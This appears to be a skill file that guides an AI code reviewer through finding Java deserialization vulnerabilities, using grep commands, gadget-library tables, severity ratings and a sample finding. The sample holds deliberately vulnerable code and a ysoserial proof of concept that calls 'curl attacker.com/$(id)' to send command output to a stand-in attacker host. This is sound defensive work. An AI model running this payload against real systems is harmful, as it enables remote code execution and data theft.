# SKILL: sast-deserial — Deserialization Vulnerability Detection

## Purpose

Identify Java deserialization sinks that can be exploited via gadget chains to achieve Remote Code Execution or other critical impacts. Focus on both native Java serialization (`ObjectInputStream`) and third-party serialization libraries (XStream, Kryo, Jackson polymorphic, Hessian, etc.).

---

## Phase 1: Sink Discovery

### 1.1 — Native Java Deserialization

```bash
# ObjectInputStream.readObject() — the primary Java deserialization sink
grep -rn "ObjectInputStream\b\|readObject()\|readUnshared()" --include="*.java"

# ObjectInputStream constructed over user-supplied stream
grep -rn "new ObjectInputStream(" --include="*.java" -B10 | grep -B10 "getInputStream\|Socket\|URLConnection\|openStream\|byte\[\]\|InputStream"

# Serialization over network (RMI, JMX)
grep -rn "UnicastRemoteObject\|Registry\b\|LocateRegistry\|RMIServerSocketFactory\|JMXConnectorServer\|JMXServiceURL" --include="*.java"

# Resolving classes during deserialization (custom ObjectInputStream)
grep -rn "resolveClass\b\|resolveObject\b" --include="*.java" -B5

# Deserialization in filters / servlets (legacy pattern)
grep -rn "readObject\b" --include="*.java" -B15 | grep -B15 "doPost\|doGet\|HttpServletRequest\|getInputStream\|HttpSession\|readFromCache"
```

### 1.2 — XStream

```bash
grep -rn "XStream\b\|com\.thoughtworks\.xstream" --include="*.java"
grep -rn "new XStream(\|xstream\.fromXML\|xstream\.toXML\|xstream\.unmarshal" --include="*.java"

# Check if XStream security framework is configured (whitelist)
grep -rn "addPermission\|XStreamSecurity\|NoTypePermission\|NullPermission\|PrimitiveTypePermission\|AllowedTypesProvider" --include="*.java" -B5
# If xstream.fromXML() appears WITHOUT security framework setup → CRITICAL
```

### 1.3 — XMLDecoder (Java Beans deserialization — also RCE)

```bash
grep -rn "XMLDecoder\b" --include="*.java"
grep -rn "new XMLDecoder\b" --include="*.java" -B10 | grep -B10 "getInputStream\|request\.\|readAllBytes\|byte\[\]"
# XMLDecoder can execute arbitrary Java — treat as CRITICAL regardless
```

### 1.4 — Jackson Polymorphic Deserialization

```bash
# enableDefaultTyping — vulnerable to gadget chains
grep -rn "enableDefaultTyping\b\|activateDefaultTyping\b" --include="*.java"

# @JsonTypeInfo with user-controlled type — class loading
grep -rn "@JsonTypeInfo.*use.*JsonTypeInfo.Id.CLASS\|@JsonTypeInfo.*use.*JsonTypeInfo.Id.MINIMAL_CLASS" --include="*.java"

# PolymorphicTypeValidator without allowlist
grep -rn "PolymorphicTypeValidator\|LaissezFaireSubTypeValidator\|DefaultBaseTypeLimitingValidator" --include="*.java"

# readValue with Object.class or Map.class and polymorphic config
grep -rn "readValue.*Object\.class\|readValue.*Map\.class" --include="*.java" | grep -v "//\|test"
```

### 1.5 — Other Deserialization Libraries

```bash
# Kryo — polymorphic type handling
grep -rn "Kryo\b\|com\.esotericsoftware\.kryo" --include="*.java"
grep -rn "kryo\.readClassAndObject\|kryo\.readObject\b" --include="*.java"

# Hessian
grep -rn "HessianInput\b\|HessianProxyFactory\|com\.caucho\.hessian" --include="*.java"

# Java Serialization via Base64 (common pattern for cookie/session deserialization)
grep -rn "Base64\.decode\|Base64Decoder\|DatatypeConverter\.parseBase64Binary" --include="*.java" -A3 | grep -A3 "ObjectInputStream\|readObject\|deserialize"

# Fastjson (CVE-laden library)
grep -rn "fastjson\|JSON\.parseObject\|JSON\.parse\b" --include="*.java"
grep -rn "com\.alibaba\.fastjson" --include="*.java"

# SnakeYAML (can deserialize arbitrary Java)
grep -rn "Yaml\b\|SnakeYAML\|new Yaml()\|yaml\.load\b\|yaml\.loadAll" --include="*.java"
# yaml.load() with SafeConstructor NOT set is dangerous

# Apache Camel deserial
grep -rn "camel.*serial\|CamelContext.*serial" --include="*.java" -i
```

---

## Phase 2: Taint Analysis

For each deserialization sink, confirm the data stream comes from an attacker-controlled source:

```bash
# Direct HTTP body deserialization
grep -rn "new ObjectInputStream\|readObject\b" --include="*.java" -B15 | \
  grep -B15 "request\.getInputStream\|getContentAsByteArray\|readAllBytes\|@RequestBody"

# Cookie deserialization (common REMEMBERME pattern)
grep -rn "Base64.*decode\b" --include="*.java" -A5 | grep -A5 "ObjectInputStream\|readObject\|cookie\|Cookie"

# Session attribute that was previously set from external input
grep -rn "session\.getAttribute\|getSession()\.get" --include="*.java" -A3 | grep -A3 "deserialize\|ObjectInputStream\|readObject"

# File upload deserialization
grep -rn "getInputStream\b" --include="*.java" -B10 | grep -B10 "MultipartFile\|Part\b\|FileItem"

# RMI server (remote clients can send arbitrary objects)
grep -rn "Remote\b.*implements\|extends UnicastRemoteObject\|Registry\b" --include="*.java"
# Any RMI server that implements Remote is a deserialization sink for unauthenticated callers
```

---

## Phase 3: Gadget Chain Context

When a deserialization sink is confirmed, note the classpath dependencies that may provide gadget chains:

```bash
# Check for dangerous gadget libraries in pom.xml / build.gradle
grep -rn "commons-collections\|commons-beanutils\|groovy-all\|spring-core\|xalan\|javassist\|rome\b\|jython\b\|myfaces" \
  --include="*.xml" --include="*.gradle" --include="*.gradle.kts" | grep -v "//\|#\|test"
```

| Library | Version Range | Gadget Type |
|---------|--------------|-------------|
| commons-collections | 3.0–3.2.1, 4.0 | InvokerTransformer → RCE |
| commons-beanutils | 1.9.2 and below | BeanComparator chain |
| groovy-all | 2.x | ConvertedClosure |
| Spring Core | present | Spring gadgets (MethodInvokingFactoryBean) |
| Xalan | any | TemplatesImpl chain |
| ROME | < 1.15 | ToStringBean chain |
| Jython | any | PyFunction chain |

---

## Phase 4: Deserialization Filter (Defense) Detection

```bash
# Java 9+ deserialization filters
grep -rn "ObjectInputFilter\|ObjectInputFilter\.Config\|createFilter\b" --include="*.java"
grep -rn "setObjectInputFilter\|setSerialFilter" --include="*.java"

# Apache SerialKiller or other whitelisting agents
grep -rn "SerialKiller\|NotSoSerial\|deserialization.*filter\|filterSpec" --include="*.java" -i

# Spring's SafeObjectInputStream
grep -rn "SafeObjectInputStream\|RestrictiveObjectInputStream" --include="*.java"
```

If no deserialization filter is present and the sink is confirmed reachable → report CRITICAL.

---

## Phase 5: Severity Assessment

| Sink | Attacker Control | Severity |
|------|-----------------|---------|
| `ObjectInputStream.readObject()` | Full body/cookie | CRITICAL |
| `XMLDecoder` | Any | CRITICAL |
| `XStream.fromXML()` without security framework | Any | CRITICAL |
| Fastjson `JSON.parseObject()` < 1.2.83 | Any | CRITICAL |
| Jackson `enableDefaultTyping()` | Any | CRITICAL |
| SnakeYAML `yaml.load()` without SafeConstructor | Any | HIGH |
| Kryo `readClassAndObject()` | Any | HIGH |
| Hessian deserialization | Remote | HIGH |
| RMI server with dangerous gadget classpath | Network | CRITICAL |
| Jackson @JsonTypeInfo CLASS with restricted type validator | Limited | MEDIUM |

---

## Finding Format

Follow the canonical format from `copilot-instructions.md`. Example:

```
### [CRITICAL] Deserialization RCE — ObjectInputStream on HTTP Request Body

**ID:** DESERIAL-001
**File:** `src/main/java/com/example/LegacyApiController.java:61`
**CWE:** CWE-502 | **OWASP:** A08:2021-Software and Data Integrity Failures
**CVSS (estimated):** 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
**Confidence:** High
**Skill:** `sast-deserial`

**Taint Path:**
`POST /api/legacy/import body (octet-stream)` → `LegacyApiController.importData(HttpServletRequest) (LegacyApiController.java:59)` → `new ObjectInputStream(request.getInputStream()) (LegacyApiController.java:61)` → `ois.readObject() (LegacyApiController.java:62)`

**Vulnerable Code:**
```java
@PostMapping("/api/legacy/import")
public ResponseEntity<?> importData(HttpServletRequest request) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
    Object data = ois.readObject(); // arbitrary deserialization
    processData(data);
    return ResponseEntity.ok().build();
}
```

**Why Exploitable:**
`ObjectInputStream.readObject()` is called on a raw HTTP request body with no allowlist filter. `commons-collections 3.2.1` is on the classpath (confirmed in pom.xml), providing the `InvokerTransformer` gadget chain. An attacker sends a crafted serialized payload to achieve OS-level RCE as the JVM process user.

**Proof-of-Concept:**
```bash
java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/$(id)" | \
  curl -X POST http://target/api/legacy/import \
       -H "Content-Type: application/octet-stream" --data-binary @-
```

**Remediation:**
1. Replace Java serialization with JSON or Protobuf — never deserialize Java objects from HTTP
2. If serialization must be kept, apply an `ObjectInputFilter` allowlist:
```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "maxdepth=10;maxarray=1000;com.example.**;!*");
ois.setObjectInputFilter(filter);
```
3. Upgrade or remove `commons-collections 3.x`; use 3.2.2+

**References:** https://cwe.mitre.org/data/definitions/502.html, OWASP A08:2021
```

JSONL line (append to `.github/sast-findings.jsonl`):
```json
{"id":"DESERIAL-001","skill":"sast-deserial","cwe":"CWE-502","owasp":"A08:2021-Software and Data Integrity Failures","severity":"Critical","confidence":"High","file":"src/main/java/com/example/LegacyApiController.java","line":62,"method":"importData","class":"com.example.LegacyApiController","evidence":"ObjectInputStream ois = new ObjectInputStream(request.getInputStream());\nObject data = ois.readObject();","sink":"ObjectInputStream.readObject()","source":"HttpServletRequest.getInputStream()","taint_path":[],"sanitizer_present":false,"sanitizer_detail":"","remediation":"Replace with JSON/Protobuf; if serialization required apply ObjectInputFilter allowlist and remove commons-collections 3.x","references":["https://cwe.mitre.org/data/definitions/502.html"],"false_positive_indicators":[],"duplicate_of":null}
```
